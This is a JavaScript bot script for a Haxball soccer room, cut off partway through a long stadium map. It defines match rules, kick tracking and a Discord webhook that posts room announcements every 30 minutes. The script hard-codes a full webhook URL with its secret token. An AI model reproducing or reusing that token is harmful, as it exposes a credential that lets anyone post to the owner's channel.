const roomName = "🟩🟦🟥 [HAX4] Real Soccer | dsc.gg/hax4";
const botName = "🤖 ÁRBITRO BOT";
const maxPlayers = 24;
const roomPublic = true;
const geo = [{code: "AG", lat: -9.189967, lon: -75.015152}];


var mapBGColor = "86A578"; // default 718C5A
var throwTimeOut = 420; // 7 seconds (var is in game ticks)
var gkTimeOut = 600; // 10 seconds (var is in game ticks)
var ckTimeOut = 600; // 10 seconds (var is in game ticks)
var throwinDistance = 270; // distance players can move the ball during throw in
var map = "RSR";
var gameTime = 10;
var roomLink = ""

var webhookUrl = "https://discord.com/api/webhooks/951911839283949569/5R3RU7ORll4QKDyRKF-L97S0WhNhRv1A5XIxFDE-KnY8tWRqZ-sxWomOmGeAp5OPCVRR";
var webhookName = "𝗟𝗣𝗙 𝗕𝗢𝗧 - 𝗛𝗢𝗦𝗧 𝗣𝗨́𝗕𝗟𝗜𝗖𝗢 𝘅𝟰 ";

function discord(message) {
var chamar = new XMLHttpRequest();
    chamar.open("POST", webhookUrl);
    chamar.setRequestHeader('Content-type', 'application/json');
    var webhook_datos = {
        username: webhookName,
        content: message
    };
    chamar.send(JSON.stringify(webhook_datos));
}

setInterval(() => { discord(`**__¡La sala de Futsal 4x4 sigue abierta! ${roomLink}__**`)}, 1800000);

const room = HBInit({roomName: roomName, maxPlayers: maxPlayers, public: roomPublic, playerName: botName, geo: geo[0], token: roomArgs['token']});

const goles_mapaSolo = 3;
const goles_mapa4vs4 = 3;
const tiempo_mapaSolo = 3;
const tiempo_mapa4vs4 = 4;

room.setTeamsLock(true);

// Contraseña

var adminPassword = 1000 + getRandomInt(9000);
console.log("Contraseña de Admin: " + adminPassword);

class Game {
	constructor(date, scores, goals) {
		this.date = date;
		this.scores = scores;
		this.goals = goals;

		this.time = 0;
		this.paused = false;
		this.ballRadius;
		this.rsTouchTeam = 0;
		this.rsActive = true;
		this.rsReady = false;
		this.rsCorner = false;
		this.rsGoalKick = false;
		this.rsSwingTimer = 1000;
		this.rsTimer;
		this.ballOutPositionX;
		this.ballOutPositionY;
		this.throwInPosY;
		this.outStatus = "";
		this.warningCount = 0;
		this.bringThrowBack = false;
		this.extraTime = false;
		this.extraTimeCount = 0;
		this.extraTimeEnd;
		this.extraTimeAnnounced = false;
		this.lastPlayAnnounced = false;
		this.boosterState;
		this.throwinKicked = false;
		this.pushedOut;
		this.lastKickerId;
		this.lastKickerName;
		this.lastKickerTeam;
		this.secondLastKickerId;
		this.secondLastKickerName;
		this.secondLastKickerTeam;
		this.redScore = 0;
		this.blueScore = 0;
	}
	
	updateLastKicker(id, name, team) {
		this.secondLastKickerId = this.lastKickerId;
		this.secondLastKickerName = this.lastKickerName;
		this.secondLastKickerTeam = this.lastKickerTeam;
		
		this.lastKickerId = id;
		this.lastKickerName = name;
		this.lastKickerTeam = team;
	}
}

// Mapas

const playerRadius = 15;
var ballRadius = 6.25;
const triggerDistance = playerRadius + ballRadius + 0.01;
var mapaSolo = '{"name":"Classic training from HaxMaps","width":420,"height":200,"spawnDistance":30,"bg":{"type":"grass","width":370,"height":170,"kickOffRadius":75,"cornerRadius":0},"vertexes":[{"x":-370,"y":170,"trait":"ballArea"},{"x":-370,"y":64,"trait":"ballArea"},{"x":-370,"y":-64,"trait":"ballArea"},{"x":-370,"y":-170,"trait":"ballArea"},{"x":370,"y":170,"trait":"ballArea"},{"x":370,"y":64,"trait":"ballArea"},{"x":370,"y":-64,"trait":"ballArea"},{"x":370,"y":-170,"trait":"ballArea"},{"x":-380,"y":-64,"trait":"goalNet"},{"x":-400,"y":-44,"trait":"goalNet"},{"x":-400,"y":44,"trait":"goalNet"},{"x":-380,"y":64,"trait":"goalNet"},{"x":380,"y":-64,"trait":"goalNet"},{"x":400,"y":-44,"trait":"goalNet"},{"x":400,"y":44,"trait":"goalNet"},{"x":380,"y":64,"trait":"goalNet"}],"segments":[{"v0":0,"v1":1,"trait":"ballArea"},{"v0":2,"v1":3,"trait":"ballArea"},{"v0":4,"v1":5,"trait":"ballArea"},{"v0":6,"v1":7,"trait":"ballArea"},{"v0":8,"v1":9,"trait":"goalNet","curve":-90},{"v0":9,"v1":10,"trait":"goalNet"},{"v0":10,"v1":11,"trait":"goalNet","curve":-90},{"v0":12,"v1":13,"trait":"goalNet","curve":90},{"v0":13,"v1":14,"trait":"goalNet"},{"v0":14,"v1":15,"trait":"goalNet","curve":90}],"goals":[],"discs":[{"pos":[-370,64],"trait":"goalPost","color":"FFCCCC"},{"pos":[-370,-64],"trait":"goalPost","color":"FFCCCC"},{"pos":[370,64],"trait":"goalPost","color":"CCCCFF"},{"pos":[370,-64],"trait":"goalPost","color":"CCCCFF"}],"planes":[{"normal":[0,1],"dist":-170,"trait":"ballArea"},{"normal":[0,-1],"dist":-170,"trait":"ballArea"},{"normal":[0,1],"dist":-200,"bCoef":0.1},{"normal":[0,-1],"dist":-200,"bCoef":0.1},{"normal":[1,0],"dist":-420,"bCoef":0.1},{"normal":[-1,0],"dist":-420,"bCoef":0.1}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":0.5},"goalNet":{"vis":true,"bCoef":3,"cMask":["ball"]}}}'

var mapa1vs1_2vs2 = '{ "name" : "「 𝗟𝗣𝗙 𝘅𝟯 𝗠𝗮𝗽 🇵🇪 」", "bg" : { "kickOffRadius" : NaN, "height" : NaN, "width" : NaN, "type" : "hockey" }, "width" : 620, "height" : 270, "vertexes" : [ /* 0 */ { "x" : -550, "y" : -80, "trait" : "v", "color" : "F5072F" }, /* 1 */ { "x" : -550, "y" : 80, "trait" : "v", "color" : "F5072F" }, /* 2 */ { "x" : -560, "y" : -80, "trait" : "v", "color" : "F5072F" }, /* 3 */ { "x" : -580, "y" : 60, "trait" : "v", "color" : "FFFFFF" }, /* 4 */ { "x" : -580, "y" : -60, "trait" : "v", "color" : "FFFFFF" }, /* 5 */ { "x" : -560, "y" : 80, "trait" : "v", "color" : "F5072F" }, /* 6 */ { "x" : 550, "y" : -80, "trait" : "v", "color" : "CCCCFF" }, /* 7 */ { "x" : 550, "y" : 80, "trait" : "v", "color" : "CCCCFF" }, /* 8 */ { "x" : 560, "y" : -80, "trait" : "v", "color" : "F5072F" }, /* 9 */ { "x" : 580, "y" : 60, "trait" : "v", "color" : "FFFFFF" }, /* 10 */ { "x" : 580, "y" : -60, "trait" : "v", "color" : "FFFFFF" }, /* 11 */ { "x" : 560, "y" : 80, "trait" : "v", "color" : "F5072F" }, /* 12 */ { "x" : -550, "y" : -200, "trait" : "v", "curve" : 180, "color" : "B6B6B8" }, /* 13 */ { "x" : -550, "y" : 200, "trait" : "v", "curve" : 180, "color" : "B6B6B8" }, /* 14 */ { "x" : 550, "y" : 200, "trait" : "v", "curve" : 180, "color" : "B6B6B8" }, /* 15 */ { "x" : 550, "y" : -200, "trait" : "v", "curve" : 180, "color" : "B6B6B8" }, /* 16 */ { "x" : 0, "y" : -240, "trait" : "v", "color" : "B6B6B8", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] }, /* 17 */ { "x" : 0, "y" : -90, "trait" : "v", "color" : "B6B6B8", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] }, /* 18 */ { "x" : 0, "y" : -270, "trait" : "v" }, /* 19 */ { "x" : 0, "y" : 90, "trait" : "v", "color" : "B6B6B8", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] }, /* 20 */ { "x" : -550, "y" : -240, "trait" : "v", "color" : "FFFFFF" }, /* 21 */ { "x" : 550, "y" : -240, "trait" : "v", "color" : "FFFFFF" }, /* 22 */ { "x" : -550, "y" : 240, "trait" : "v", "color" : "FFFFFF" }, /* 23 */ { "x" : 0, "y" : 240, "trait" : "v", "color" : "B6B6B8", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] }, /* 24 */ { "x" : 0, "y" : 270, "trait" : "v" }, /* 25 */ { "x" : 550, "y" : 240, "trait" : "v", "color" : "FFFFFF" }, /* 26 */ { "x" : -375, "y" : -255, "cMask" : [ ] }, /* 27 */ { "x" : -375, "y" : -225, "cMask" : [ ] }, /* 28 */ { "x" : -275, "y" : -255, "cMask" : [ ] }, /* 29 */ { "x" : -275, "y" : -225, "cMask" : [ ] }, /* 30 */ { "x" : -175, "y" : -255, "cMask" : [ ] }, /* 31 */ { "x" : -175, "y" : -225, "cMask" : [ ] }, /* 32 */ { "x" : 175, "y" : -255, "cMask" : [ ] }, /* 33 */ { "x" : 175, "y" : -225, "cMask" : [ ] }, /* 34 */ { "x" : 275, "y" : -255, "cMask" : [ ] }, /* 35 */ { "x" : 275, "y" : -225, "cMask" : [ ] }, /* 36 */ { "x" : 375, "y" : -255, "cMask" : [ ] }, /* 37 */ { "x" : 375, "y" : -225, "cMask" : [ ] }, /* 38 */ { "x" : -375, "y" : 225, "cMask" : [ ] }, /* 39 */ { "x" : -375, "y" : 255, "cMask" : [ ] }, /* 40 */ { "x" : -275, "y" : 225, "cMask" : [ ] }, /* 41 */ { "x" : -275, "y" : 255, "cMask" : [ ] }, /* 42 */ { "x" : -175, "y" : 225, "cMask" : [ ] }, /* 43 */ { "x" : -175, "y" : 255, "cMask" : [ ] }, /* 44 */ { "x" : 175, "y" : 225, "cMask" : [ ] }, /* 45 */ { "x" : 175, "y" : 255, "cMask" : [ ] }, /* 46 */ { "x" : 275, "y" : 225, "cMask" : [ ] }, /* 47 */ { "x" : 275, "y" : 255, "cMask" : [ ] }, /* 48 */ { "x" : 375, "y" : 225, "cMask" : [ ] }, /* 49 */ { "x" : 375, "y" : 255, "cMask" : [ ] }, /* 50 */ { "x" : -565, "y" : -160, "cMask" : [ ] }, /* 51 */ { "x" : -535, "y" : -160, "cMask" : [ ] }, /* 52 */ { "x" : -565, "y" : 160, "cMask" : [ ] }, /* 53 */ { "x" : -535, "y" : 160, "cMask" : [ ] }, /* 54 */ { "x" : 536, "y" : -160, "cMask" : [ ] }, /* 55 */ { "x" : 565, "y" : -160, "cMask" : [ ] }, /* 56 */ { "x" : 536, "y" : 160, "cMask" : [ ] }, /* 57 */ { "x" : 565, "y" : 160, "cMask" : [ ] }, /* 58 */ { "x" : -68.48146087802112, "y" : 34.38843757250262, "cMask" : [ ], "color" : "B6B6B8" }, /* 59 */ { "x" : -68.48146087802112, "y" : 27.876323528365283, "cMask" : [ ], "color" : "B6B6B8" }, /* 60 */ { "x" : -55.457232789746456, "y" : 21.364209484227942, "cMask" : [ ], "color" : "B6B6B8" }, /* 61 */ { "x" : -29.408776613197105, "y" : 21.364209484227942, "cMask" : [ ], "color" : "B6B6B8" }, /* 62 */ { "x" : -29.408776613197105, "y" : 34.38843757250262, "cMask" : [ ], "color" : "B6B6B8" }, /* 63 */ { "x" : -68.48146087802112, "y" : 11.596038418021932, "cMask" : [ ], "curve" : 35, "color" : "B6B6B8" }, /* 64 */ { "x" : -68.48146087802112, "y" : -37.24481691300812, "cMask" : [ ], "color" : "B6B6B8" }, /* 65 */ { "x" : -55.457232789746456, "y" : -37.24481691300812, "cMask" : [ ], "color" : "B6B6B8" }, /* 66 */ { "x" : -55.457232789746456, "y" : -3.381823883493944, "cMask" : [ ], "curve" : 40, "color" : "B6B6B8" }, /* 67 */ { "x" : -19.640605546991093, "y" : 34.38843757250262, "cMask" : [ ], "color" : "B6B6B8" }, /* 68 */ { "x" : -19.640605546991093, "y" : 7.688769991539532, "cMask" : [ ], "color" : "B6B6B8" }, /* 69 */ { "x" : -6.616377458716418, "y" : 3.7815015650571286, "cMask" : [ ], "color" : "B6B6B8" }, /* 70 */ { "x" : -6.616377458716418, "y" : 34.38843757250262, "cMask" : [ ], "color" : "B6B6B8" }, /* 71 */ { "x" : 2.500582203075857, "y" : 1.8278673518159274, "cMask" : [ ], "color" : "B6B6B8" }, /* 72 */ { "x" : 5.105427820730793, "y" : 1.8278673518159274, "cMask" : [ ], "color" : "B6B6B8" }, /* 73 */ { "x" : -19.640605546991093, "y" : -3.381823883493944, "cMask" : [ ], "color" : "B6B6B8" }, /* 74 */ { "x" : -19.640605546991093, "y" : -37.24481691300812, "cMask" : [ ], "color" : "B6B6B8" }, /* 75 */ { "x" : 5.105427820730793, "y" : -37.24481691300812, "cMask" : [ ], "color" : "B6B6B8" }, /* 76 */ { "x" : 19.43207871783294, "y" : -20.96453180266476, "cMask" : [ ], "color" : "B6B6B8" }, /* 77 */ { "x" : 19.43207871783294, "y" : -7.94030371439008, "cMask" : [ ], "color" : "B6B6B8" }, /* 78 */ { "x" : 3.1517936074895916, "y" : -11.196360736458752, "cMask" : [ ], "color" : "B6B6B8" }, /* 79 */ { "x" : -6.616377458716418, "y" : -5.986669501148881, "cMask" : [ ], "color" : "B6B6B8" }, /* 80 */ { "x" : -6.616377458716418, "y" : -24.220588824733433, "cMask" : [ ], "color" : "B6B6B8" }, /* 81 */ { "x" : 3.1517936074895916, "y" : -24.220588824733433, "cMask" : [ ], "color" : "B6B6B8" }, /* 82 */ { "x" : 29.200249784038945, "y" : 34.38843757250262, "cMask" : [ ], "color" : "B6B6B8" }, /* 83 */ { "x" : 29.200249784038945, "y" : -2.0794010746664777, "cMask" : [ ], "color" : "B6B6B8" }, /* 84 */ { "x" : 42.22447787231363, "y" : -3.381823883493944, "cMask" : [ ], "color" : "B6B6B8" }, /* 85 */ { "x" : 61.760820004725645, "y" : -3.381823883493944, "cMask" : [ ], "color" : "B6B6B8" }, /* 86 */ { "x" : 61.760820004725645, "y" : 1.8278673518159274, "cMask" : [ ], "color" : "B6B6B8" }, /* 87 */ { "x" : 42.22447787231363, "y" : 1.8278673518159274, "cMask" : [ ], "color" : "B6B6B8" }, /* 88 */ { "x" : 42.22447787231363, "y" : 34.38843757250262, "cMask" : [ ], "color" : "B6B6B8" }, /* 89 */ { "x" : 29.200249784038945, "y" : -7.94030371439008, "cMask" : [ ], "color" : "B6B6B8" }, /* 90 */ { "x" : 29.200249784038945, "y" : -37.24481691300812, "cMask" : [ ], "color" : "B6B6B8" }, /* 91 */ { "x" : 68.272934048863, "y" : -37.24481691300812, "cMask" : [ ], "color" : "B6B6B8" }, /* 92 */ { "x" : 68.272934048863, "y" : -24.220588824733433, "cMask" : [ ], "color" : "B6B6B8" }, /* 93 */ { "x" : 42.22447787231363, "y" : -24.220588824733433, "cMask" : [ ], "color" : "B6B6B8" }, /* 94 */ { "x" : 42.22447787231363, "y" : -11.196360736458752, "cMask" : [ ], "color" : "B6B6B8" }, /* 95 */ { "x" : 61.760820004725645, "y" : -11.196360736458752, "cMask" : [ ], "color" : "B6B6B8" }, /* 96 */ { "x" : 74.7850480930003, "y" : -2.730612479080211, "cMask" : [ ], "color" : "B6B6B8" }, /* 97 */ { "x" : -67.17903806919365, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 98 */ { "x" : -67.17903806919365, "y" : 10.944827013608203, "cMask" : [ ], "color" : "B6B6B8" }, /* 99 */ { "x" : -65.87661526036621, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 100 */ { "x" : -65.87661526036621, "y" : 9.642404204780734, "cMask" : [ ], "color" : "B6B6B8" }, /* 101 */ { "x" : -64.57419245153872, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 102 */ { "x" : -64.57419245153872, "y" : 8.991192800366997, "cMask" : [ ], "color" : "B6B6B8" }, /* 103 */ { "x" : -63.27176964271125, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 104 */ { "x" : -63.27176964271125, "y" : 8.991192800366997, "cMask" : [ ], "color" : "B6B6B8" }, /* 105 */ { "x" : -61.9693468338838, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 106 */ { "x" : -61.9693468338838, "y" : 8.339981395953266, "cMask" : [ ], "color" : "B6B6B8" }, /* 107 */ { "x" : -60.666924025056325, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 108 */ { "x" : -60.666924025056325, "y" : 7.688769991539532, "cMask" : [ ], "color" : "B6B6B8" }, /* 109 */ { "x" : -59.36450121622886, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 110 */ { "x" : -59.36450121622886, "y" : 7.037558587125794, "cMask" : [ ], "color" : "B6B6B8" }, /* 111 */ { "x" : -58.06207840740141, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 112 */ { "x" : -58.06207840740141, "y" : 7.037558587125794, "cMask" : [ ], "color" : "B6B6B8" }, /* 113 */ { "x" : -56.75965559857392, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 114 */ { "x" : -56.75965559857392, "y" : 6.386347182712063, "cMask" : [ ], "color" : "B6B6B8" }, /* 115 */ { "x" : -18.33818273816363, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 116 */ { "x" : -18.33818273816363, "y" : -3.381823883493944, "cMask" : [ ], "color" : "B6B6B8" }, /* 117 */ { "x" : -17.03575992933616, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 118 */ { "x" : -17.03575992933616, "y" : -4.033035287907677, "cMask" : [ ], "color" : "B6B6B8" }, /* 119 */ { "x" : -15.733337120508693, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 120 */ { "x" : -15.733337120508693, "y" : -4.033035287907677, "cMask" : [ ], "color" : "B6B6B8" }, /* 121 */ { "x" : -14.43091431168122, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 122 */ { "x" : -14.43091431168122, "y" : -5.009852394528279, "cMask" : [ ], "color" : "B6B6B8" }, /* 123 */ { "x" : -13.77970290726749, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 124 */ { "x" : -13.77970290726749, "y" : -5.009852394528279, "cMask" : [ ], "color" : "B6B6B8" }, /* 125 */ { "x" : -12.477280098440021, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 126 */ { "x" : -12.477280098440021, "y" : -5.335458096735146, "cMask" : [ ], "color" : "B6B6B8" }, /* 127 */ { "x" : -11.174857289612554, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 128 */ { "x" : -11.174857289612554, "y" : -5.335458096735146, "cMask" : [ ], "color" : "B6B6B8" }, /* 129 */ { "x" : -9.872434480785085, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 130 */ { "x" : -9.872434480785085, "y" : -5.661063798942013, "cMask" : [ ], "color" : "B6B6B8" }, /* 131 */ { "x" : -8.570011671957618, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 132 */ { "x" : -8.570011671957618, "y" : -5.661063798942013, "cMask" : [ ], "color" : "B6B6B8" }, /* 133 */ { "x" : -7.2675888631301495, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 134 */ { "x" : -7.2675888631301495, "y" : -5.986669501148881, "cMask" : [ ], "color" : "B6B6B8" }, /* 135 */ { "x" : 29.851461188452674, "y" : -35.94239410418064, "cMask" : [ ], "color" : "B6B6B8" }, /* 136 */ { "x" : 67.62172264444925, "y" : -35.94239410418064, "cMask" : [ ], "color" : "B6B6B8" }, /* 137 */ { "x" : 29.851461188452674, "y" : -34.63997129535316, "cMask" : [ ], "color" : "B6B6B8" }, /* 138 */ { "x" : 67.62172264444925, "y" : -34.63997129535316, "cMask" : [ ], "color" : "B6B6B8" }, /* 139 */ { "x" : 29.851461188452674, "y" : -33.337548486525705, "cMask" : [ ], "color" : "B6B6B8" }, /* 140 */ { "x" : 67.62172264444925, "y" : -33.337548486525705, "cMask" : [ ], "color" : "B6B6B8" }, /* 141 */ { "x" : 29.851461188452674, "y" : -32.03512567769824, "cMask" : [ ], "color" : "B6B6B8" }, /* 142 */ { "x" : 67.62172264444925, "y" : -32.03512567769824, "cMask" : [ ], "color" : "B6B6B8" }, /* 143 */ { "x" : 29.851461188452674, "y" : -30.732702868870767, "cMask" : [ ], "color" : "B6B6B8" }, /* 144 */ { "x" : 67.62172264444925, "y" : -30.732702868870767, "cMask" : [ ], "color" : "B6B6B8" }, /* 145 */ { "x" : 29.851461188452674, "y" : -29.4302800600433, "cMask" : [ ], "color" : "B6B6B8" }, /* 146 */ { "x" : 67.62172264444925, "y" : -29.4302800600433, "cMask" : [ ], "color" : "B6B6B8" }, /* 147 */ { "x" : 29.851461188452674, "y" : -28.12785725121583, "cMask" : [ ], "color" : "B6B6B8" }, /* 148 */ { "x" : 67.62172264444925, "y" : -28.12785725121583, "cMask" : [ ], "color" : "B6B6B8" }, /* 149 */ { "x" : 29.851461188452674, "y" : -26.82543444238836, "cMask" : [ ], "color" : "B6B6B8" }, /* 150 */ { "x" : 67.62172264444925, "y" : -26.82543444238836, "cMask" : [ ], "color" : "B6B6B8" }, /* 151 */ { "x" : 29.851461188452674, "y" : -25.5230116335609, "cMask" : [ ], "color" : "B6B6B8" }, /* 152 */ { "x" : 67.62172264444925, "y" : -25.5230116335609, "cMask" : [ ], "color" : "B6B6B8" }, /* 153 */ { "x" : 30.502672592866418, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 154 */ { "x" : 30.502672592866418, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 155 */ { "x" : 31.80509540169389, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 156 */ { "x" : 31.80509540169389, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 157 */ { "x" : 33.10751821052134, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 158 */ { "x" : 33.10751821052134, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 159 */ { "x" : 34.40994101934882, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 160 */ { "x" : 34.40994101934882, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 161 */ { "x" : 35.712363828176294, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 162 */ { "x" : 35.712363828176294, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 163 */ { "x" : 37.01478663700376, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 164 */ { "x" : 37.01478663700376, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 165 */ { "x" : 38.31720944583122, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 166 */ { "x" : 38.31720944583122, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 167 */ { "x" : 39.61963225465869, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 168 */ { "x" : 39.61963225465869, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 169 */ { "x" : 40.92205506348615, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 170 */ { "x" : 40.92205506348615, "y" : -9.24272652321755, "cMask" : [ ], "color" : "B6B6B8" }, /* 171 */ { "x" : -56.75965559857392, "y" : -3.381823883493944, "cMask" : [ ], "curve" : 30.5, "color" : "B6B6B8" }, /* 172 */ { "x" : 61.5871662800013, "y" : -5.595938683821658, "cMask" : [ ], "curve" : 30.5, "color" : "B6B6B8" }, /* 173 */ { "x" : -56.28209791888454, "y" : -1.4281896702527428, "cMask" : [ ], "color" : "B6B6B8" }, /* 174 */ { "x" : 49.86536100055409, "y" : -8.20078430147659, "cMask" : [ ], "color" : "B6B6B8" }, /* 175 */ { "x" : -60.84057774978067, "y" : 1.5673867647294153, "cMask" : [ ], "color" : "B6B6B8" }, /* 176 */ { "x" : 40.74840133876181, "y" : -9.503207110304064, "cMask" : [ ], "color" : "B6B6B8" }, /* 177 */ { "x" : -57.584520727712, "y" : 1.5673867647294153, "cMask" : [ ], "color" : "B6B6B8" }, /* 178 */ { "x" : 50.516572404967825, "y" : -8.851995705890326, "cMask" : [ ], "color" : "B6B6B8" }, /* 179 */ { "x" : -56.27589741967259, "y" : 2.013932011661616, "cMask" : [ ], "color" : "B6B6B8" }, /* 180 */ { "x" : 46.615504477697364, "y" : -8.405450458958125, "cMask" : [ ], "color" : "B6B6B8" }, /* 181 */ { "x" : -59.53195444174125, "y" : 3.9675662249028187, "cMask" : [ ], "color" : "B6B6B8" }, /* 182 */ { "x" : 58.33730975714459, "y" : -7.754239054544392, "cMask" : [ ], "color" : "B6B6B8" }, /* 183 */ { "x" : -56.27589741967259, "y" : 4.6187776293165514, "cMask" : [ ], "color" : "B6B6B8" }, /* 184 */ { "x" : 42.70823605121497, "y" : -7.103027650130657, "cMask" : [ ], "color" : "B6B6B8" }, /* 185 */ { "x" : -58.22953163291379, "y" : 7.223623246971485, "cMask" : [ ], "color" : "B6B6B8" }, /* 186 */ { "x" : 16.008568470251877, "y" : -8.405450458958125, "cMask" : [ ], "color" : "B6B6B8" }, /* 187 */ { "x" : -57.07596055196287, "y" : 2.869809573556882, "cMask" : [ ], "color" : "B6B6B8" }, /* 188 */ { "x" : -34.28356139748218, "y" : -5.595938683821658, "cMask" : [ ], "color" : "B6B6B8" }, /* 189 */ { "x" : -57.72717195637661, "y" : 3.5210209779706174, "cMask" : [ ], "color" : "B6B6B8" }, /* 190 */ { "x" : 13.906082529134125, "y" : -9.503207110304064, "cMask" : [ ], "color" : "B6B6B8" }, /* 191 */ { "x" : -55.77353774313541, "y" : -1.688670257339255, "cMask" : [ ], "color" : "B6B6B8" }, /* 192 */ { "x" : -34.28356139748218, "y" : -6.898361492649126, "cMask" : [ ], "color" : "B6B6B8" }, /* 193 */ { "x" : -55.77353774313541, "y" : 4.172232382384351, "cMask" : [ ], "color" : "B6B6B8" }, /* 194 */ { "x" : -13.444796456242704, "y" : -8.20078430147659, "cMask" : [ ], "color" : "B6B6B8" }, /* 195 */ { "x" : -59.47614994883373, "y" : 0.26496395590194766, "cMask" : [ ], "color" : "B6B6B8" }, /* 196 */ { "x" : -41.893442029662914, "y" : -0.3862474485117864, "cMask" : [ ], "color" : "B6B6B8" }, /* 197 */ { "x" : -55.66188901053053, "y" : -1.949160781123221, "cMask" : [ ], "color" : "B6B6B8" }, /* 198 */ { "x" : -43.94008373108331, "y" : -1.2979493767094872, "cMask" : [ ], "color" : "B6B6B8" }, /* 199 */ { "x" : -8.570011671957618, "y" : -6.898361492649126, "cMask" : [ ], "color" : "B6B6B8" }, /* 200 */ { "x" : 20.73450152666041, "y" : -8.20078430147659, "cMask" : [ ], "color" : "B6B6B8" }, /* 201 */ { "x" : -7.918800267543885, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 202 */ { "x" : 7.710273438385727, "y" : -36.59360550859437, "cMask" : [ ], "color" : "B6B6B8" }, /* 203 */ { "x" : -7.918800267543885, "y" : -35.29118269976691, "cMask" : [ ], "color" : "B6B6B8" }, /* 204 */ { "x" : 10.9663304604544, "y" : -35.29118269976691, "cMask" : [ ], "color" : "B6B6B8" }, /* 205 */ { "x" : -7.918800267543885, "y" : -33.988759890939434, "cMask" : [ ], "color" : "B6B6B8" }, /* 206 */ { "x" : 13.571176078109335, "y" : -33.988759890939434, "cMask" : [ ], "color" : "B6B6B8" }, /* 207 */ { "x" : -7.918800267543885, "y" : -32.686337082111976, "cMask" : [ ], "color" : "B6B6B8" }, /* 208 */ { "x" : 14.8735988869368, "y" : -32.686337082111976, "cMask" : [ ], "color" : "B6B6B8" }, /* 209 */ { "x" : -7.918800267543885, "y" : -31.3839142732845, "cMask" : [ ], "color" : "B6B6B8" }, /* 210 */ { "x" : 15.524810291350533, "y" : -31.3839142732845, "cMask" : [ ], "color" : "B6B6B8" }, /* 211 */ { "x" : -7.918800267543885, "y" : -30.081491464457038, "cMask" : [ ], "color" : "B6B6B8" }, /* 212 */ { "x" : 16.17602169576427, "y" : -30.081491464457038, "cMask" : [ ], "color" : "B6B6B8" }, /* 213 */ { "x" : -7.918800267543885, "y" : -28.779068655629565, "cMask" : [ ], "color" : "B6B6B8" }, /* 214 */ { "x" : 16.827233100178006, "y" : -28.779068655629565, "cMask" : [ ], "color" : "B6B6B8" }, /* 215 */ { "x" : -7.918800267543885, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 216 */ { "x" : 17.47844450459174, "y" : -27.476645846802096, "cMask" : [ ], "color" : "B6B6B8" }, /* 217 */ { "x" : -7.918800267543885, "y" : -26.17422303797463, "cMask" : [ ], "color" : "B6B6B8" }, /* 218 */ { "x" : 18.12965590900547, "y" : -26.17422303797463, "cMask" : [ ], "color" : "B6B6B8" }, /* 219 */ { "x" : -7.918800267543885, "y" : -24.87180022914717, "cMask" : [ ], "color" : "B6B6B8" }, /* 220 */ { "x" : 18.780867313419204, "y" : -24.87180022914717, "cMask" : [ ], "color" : "B6B6B8" }, /* 221 */ { "x" : 0, "y" : -90, "cMask" : ["red","blue" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "cGroup" : ["blueKO" ] }, /* 222 */ { "x" : 0, "y" : 90, "cMask" : ["red","blue" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "cGroup" : ["blueKO" ] }, /* 223 */ { "x" : 0, "y" : -90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 224 */ { "x" : 0, "y" : 90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 225 */ { "x" : 0, "y" : -90, "cMask" : ["wall" ], "color" : 